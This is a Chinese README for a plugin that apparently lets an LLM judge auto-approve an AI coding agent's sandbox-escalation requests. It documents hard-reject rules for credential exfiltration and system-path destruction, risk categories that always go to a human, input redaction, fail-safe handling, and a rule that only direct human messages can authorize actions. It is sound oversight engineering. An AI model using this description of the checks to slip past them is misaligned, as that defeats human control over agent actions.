> `hard-reject` 与 `judge-deny` 是**判定层静默拒绝**（未弹窗）：分别对应硬拒档与判定器 `deny`／连续失败。审查视图对它们显示红色「已直接拒绝」并标注具体原因。
>
> `reconsidered` 是**追认记录**（v0.7.0+）：`reconsiderOf` 指回被追认的原事件。事件 API 会过滤掉追认记录本身，并给原事件加上 `reconsidered: true`，前端据此标注「已追认放行 · …（曾直接拒绝）」并撤销待处理角标。追认不改写原事件：拒绝确实发生过，原因仍留在括号里可见（v0.7.1 文案）。

## 追认 API（v0.7.0+）

| 接口 | 方法 | 说明 |
|------|------|------|
| `/api/auto-approve/reconsider` | POST | `{sessionId, eventId, retry?, scope?}` → 追认一次判定层静默拒绝。`scope` 取 `once`（**仅本次**：不写规则，挂一次性额度只放行重试那一次）/ `session`（默认，写入带会话归属的规则）/ `global`（显式选全局，不要求会话归属）。写入带指纹的 `allowRules`（`description` 前缀「用户追认：」），并按 `retry !== false` 投递重试指令。返回 `{ok, scope, rule, duplicate, delivery}`（`once` 时 `rule` 为 null）；不可追认时 400 并给出原因（`error` 说明是硬拒档、硬风险类别，还是 `scope=session` 却无会话归属——后者可改选「全局」） |

围栏（服务端强制，UI 只是不显示按钮）：`kind` 必须是 `judge-deny`；`category` 不得命中 `hardCategories`。

## 文件改动对比与撤销 API（v0.5.0+）

| 接口 | 方法 | 说明 |
|------|------|------|
| `/api/auto-approve/diff?eventId=&path=` | GET | 返回指定事件/文件的变更行（`changedLines`，add/del）与统计（`stats`），只读该事件快照中列出的路径 |
| `/api/auto-approve/revert` | POST | `{sessionId, eventId}` → 组装撤销指令投递到对应会话（typertGateway 优先，agent.followup 兜底） |
| `/api/auto-approve/snapshots-stats?sessionId=` | GET | 快照占用统计 `{count, bytes, ids, files}`（ids = 仍有快照的事件列表，用于判定哪些文件可点击；带 sessionId 时只统计该会话） |
| `/api/auto-approve/snapshots-clear` | POST | 删除快照文件（仅限 `snapshots/` 目录内 `.json`）；带 `{sessionId}` 时只清该会话，否则清空全部 |

## 学习语义（v0.3.0+，v0.9.3 起按会话隔离）

中立操作确认制：同一**会话**内，同一「工具|模式|类别」每被人工批准一次计数 +1；**确认满 N 次（默认 3）后，第 N+1 次起自动放行**并沉淀带指纹规则。阈值状态内：指纹命中直接放行；未命中由 Flash 对照确认样本做语义同类验证（SAME 放行 / DIFFERENT 人工）；拒绝升级 denyRules 永久人工（**有意不按会话隔离**）；「正在学习」可在设置页终止。

**作用域（v0.9.4）**——新审批可选「仅本次 / 本会话 / 全局」，默认本会话：

| 对象 | 作用域 | 说明 |
|------|--------|------|
| 学习计数 / 样本（`learning.json`） | 产生它的会话 | key 为 `sessionId\|工具\|模式\|类别`；上限 400 条，超出淘汰最旧 |
| 自动沉淀（学习达标 / 判定器不可用后批准） | 设置页「新审批沉淀的作用域」 | 默认**本会话**；可在追认时逐个另选 |
| 追认产生的放行规则 | **逐次可选** | 提示条与审批记录行各有三个按钮：**仅本次**（不写规则，只放行重试那一次）/ 本会话 / 全局 |
| `scope:'session'` 但**没有**会话归属的规则 | **不生效**（'none'） | fail-safe：证明不了归属就绝不因此升级成全局 |
| 规则来源 | 全局（除非显式会话作用域） | 用户手写、仓库种子、内置默认，以及**本次升级前沉淀的旧规则**（含旧追认规则）都全局生效 |
| `denyRules`（拒绝升级） | 全局 | 有意不对称：拒绝侧跨会话只会多弹一次人工，不会放行任何东西 |

会话规则随时可在设置页 ② 白名单卡片点**「提升为全局」**改成全局；也可以在添加规则时手写（描述记为「用户自定义」→ 全局）。

**关于「仅本次」**：它不写规则、也不留任何持久状态，只给「让 AI 重试一次」挂一张一次性额度（进程内存，消费即失效）。因此它不会在磁盘上留下可被误用的长期放行。

## 安全设计

1. **硬拒层最高优先且单调**（吸收自 dsh-auto-mode）：凭据外泄与根/系统路径销毁基于**路径与凭据事实**直接拒绝，判定模型无权推翻；home 根、审批门自身数据与凭据文件仍转人工，DSH 配置（`$DSH_HOME` 的 profile / 插件 / 依赖）自 v0.9.5 起自动放行
2. **DENY 层次优先**：不可逆危险词命中即转人工，不消耗模型调用
3. **硬风险类别永远人工（对称安全闸，v0.7.0 修正）**：`deletion`/`credential`/`remote`/`system`/`bulk` 不计数、不学习、不可被沉淀规则覆盖，也**不可被追认**；无论判定模型给 `allow` 还是 `deny`，命中硬类别一律**转人工**。此前 `deny` 分支排在硬类别之前，模型对硬类别判 `deny` 会被静默拒绝，使配置的硬类别失效——现已修复
4. **判定输入脱敏**：密钥与大块正文在送出前被抹除/截断；工作区路径含敏感形态时转人工而不外发
5. **授权来源唯一**：仅直接人类消息构成授权，仓库内容/工具输出/assistant/skill/插件/子代理文本均不能授权
6. **学习规则带类别 + 操作指纹 + 作用域**：沉淀的是 `{tool, mode, category, contains, scope?, sessionId?}`（contains = 用户确认过的操作指纹），只放行同一指纹的操作；作用域由设置页决定（默认本会话），`scope:'global'` 全局生效，`scope:'session'` 必须带 `sessionId`（无归属则不生效，绝不静默升级成全局）。指纹未命中时由判定模型做**语义级同类验证**（基于用户确认样本判断操作意图是否同类），判 DIFFERENT/验证失败一律人工；拒绝过的操作升级 denyRules（带指纹，提取不到则拦全部同类），永不自动放行
7. **fail-safe**：判定输出格式不合规（非 JSON、缺键、多键、非法裁决/类别、空或超长 reason）一律按失败处理；判定器连续失败前 2 次静默拒绝、第 3 次转人工，绝不自动放行硬风险
8. **可回补优先**：`workspace-write`（写工作区）默认放行，越界才走判定
9. **按会话门控**：只有显式选中「自动审批（Flash）」预设的会话才介入；审批产生的放行规则按设置页的作用域写（默认仅本会话，可逐次选全局或一键提升）
10. **只预判、不执行**：插件只返回允许/拒绝/转人工决策，不修改审批流程的其他环节
11. **API 来源围栏（v0.9.3 收紧）**：`/api/auto-approve/*` 优先走宿主凭据围栏 `connection.requestRejection`（与 `/api/health`、`/api/sessions` 同一套 cookie/token）；退化路径（未加载 connection 时）要求来源与请求 `Host` 逐字同源（scheme + host + port），仅「Host 为回环且来源为回环别名」允许跨端口，`javascript:` / `data:` / `null` 来源一律拒绝。**DNS rebinding 的字面同源页面无法靠 Origin 比对识别**——真正的防线是凭据围栏（rebinding 页面拿不到 127.0.0.1 上的 cookie），退化路径只应视为旧版部署的兜底

> 警告：自动审批会显著降低人工介入频率。**仅供可信环境使用**，涉及生产数据、远程系统、支付扣费等高风险场景请保持 `ask` 预设。

## 技术说明

- 挂载于 `approval/request` 瀑布最前（`prepend: true`，先于 web answerer 接单）
- 门控：`permissionPresets.current(session) === 'auto-approve'`（传 Session 对象：内部走 sessionProjections.stateOf(session,'permissions')）
- DSH 审批触发点是沙箱越界，`reason` 固定为 `escalate sandbox to <mode>: <justification>`，`mode` 仅 `workspace-write` / `danger-full-access` 两级
- 判定模型：`reasoningEffort: 'off'` + `maxTokens: 256`，输出**严格 JSON** `{decision, reason, category}`（`decision` ∈ `allow`/`ask`/`deny`，`category` ∈ `deletion`/`credential`/`remote`/`system`/`bulk`/`neutral`，`reason` 非空且 ≤1000 字符）；允许 ```json 围栏，任何偏差抛错并按 fail-safe 处理
- 超时兜底：`AbortController` 传入 `llm.stream` 的 signal（可取消底层请求），`Promise.race` + `ctx.timeout(judgeTimeoutMs)`，超时 abort 并重试 1 次
- 同类验证：把当前操作背景/目的 + 用户确认样本交给 flash 语义判断（`SAME`/`DIFFERENT`），失败按 DIFFERENT 处理
- 学习闭环：通过 waterfall 的 `next()` 返回值捕获人工裁决结果（`allowed-once` 沉淀 / `rejected` 升级）
- 审查 UI：host 写 `events.jsonl` + `GET /api/auto-approve/events`（按 sessionId 过滤 + since 增量）；client 轮询展示
- 快照与 diff：审批发生在写入前，自动放行事件落盘时保存 `snapshots/<eventId>.json`（仅文本 ≤256KB、每事件 ≤5 个文件）；diff 用近似逐行匹配只返回变更行（上限 500 行）
- 撤销投递：`sendToSession` 优先 `typertGateway.invoke({namespace:'session', method:'prompt'})`（queue 模式），失败回退 `agent.followup`
- 硬拒与脱敏实现：`src/paths.mjs`（路径规范化、关键路径与破坏性目标熔断、凭据材料与外发 URL 凭据判定）+ `src/classifier.mjs`（严格 JSON 裁决解析）+ `src/sanitize.mjs`（判定输入脱敏）
- 动态系统提示：`systemPrompt.context`，`name: 'approval-gate:policy'`，顺序紧随宿主沙箱策略；文本回调对非 `auto-approve` 预设的会话返回 `''`（不注入）

## 测试

`npm test` 先对所有源码做语法检查，再运行六个测试文件：

| 文件 | 覆盖内容 |
|------|----------|
| `test/absorbed.test.mjs` | 五项吸收能力的回归测试，断言针对 `src/` 下的**真实导出实现**（不在测试内重复逻辑）：结构化 JSON 裁决协议、判定输入脱敏、按会话的判定失败计数、确定性硬拒两档、动态系统提示上下文（仅预设激活时注入）。用临时 `DSH_HOME` 隔离，绝不触碰真实 `~/.dsh/auto-approve` |
| `test/unit.test.mjs` | 规则匹配、配置迁移、多机规则共享，以及 `looksDeny` 的**边界匹配**回归（直接打生产导出实现，不在测试内复制逻辑）：`Format-Table` / `--format` 前缀误伤、`--force-with-lease` / `--force-if-includes` / `docker rmi` 标志延长误报、真危险词在边界上仍必须命中 |
| `test/pipeline.test.mjs` | 判定管道端到端测试，用**模拟宿主**真正执行注册的 `approval/request` 处理器：硬拒直接拒绝（不弹窗）→ 硬事实转人工 → 危险词 → **DSH 配置自动放行** → 白名单 → 脱敏 → 结构化判定 → 硬类别（优先于 allow/deny）→ `deny`/`allow`/`ask` → 连续失败计数 → 确认制学习。断言处理器返回的裁决、是否调用了 `next()`（即是否弹窗），以及真正发给判定模型的消息内容。含 `deny + neutral` 静默拒绝与 `deny + 硬类别` 转人工的对照用例，以及用例 3b：**DSH 配置档的三条边界**（profile 改动自动放行且不调判定器、事件标 `dsh-config`；审批门自身数据目录即使有白名单规则也转人工；危险词排在 dsh-config 档之前） |
| `test/reconsider.test.mjs` | 追认端点（`POST /api/auto-approve/reconsider`）的契约：硬拒档与硬风险类别一律 400 且不写规则、neutral 静默拒绝可追认（写带指纹规则 + 投递重试 + 记录 `reconsiderOf`）、事件 API 标注 `reconsidered` 并过滤追认记录、重复追认幂等、未知事件 404 |
| `test/client-render-smoke.test.mjs` | 客户端 bundle 的**真实渲染**冒烟测试（最小 React hooks 垫片 + DOM/fetch 桩）：拒绝提示条常驻且带「重新审批通过」/「查看审批记录」、硬拒档不给追认按钮、审批视图仅可追认行有按钮、打开审批 tab 标记已读、已读记录刷新后不再弹 |

`test/unit.test.mjs` 与 `test/seed-sync.test.mjs` 覆盖既有的规则匹配、配置迁移与多机规则共享；前者另含 `looksDeny` 的**边界匹配**回归（见上表）。

## 上游署名

以下五项能力移植自 [NanmiCoder/dsh-auto-mode](https://github.com/NanmiCoder/dsh-auto-mode)（MIT License），
并按本插件的确认制学习管道做了适配：

1. 确定性硬拒层（路径事实 + 凭据外泄，分直接拒绝 / 转人工两档）
2. 判定输入脱敏（密钥与大块正文不出站）
3. 结构化 JSON 裁决协议（`decision` / `reason` / `category`）
4. 判定器连续失败计数（`judgeFailureLimit`）
5. 动态系统提示指导（`<auto_approve_policy>`）

这些能力的原始设计与实现版权归该项目所有。

## License

MIT

本项目是 [moon09300731/dsh-approval-gate](https://github.com/moon09300731/dsh-approval-gate) 的 fork，
原作者版权声明保留在 [LICENSE](../LICENSE) 中。
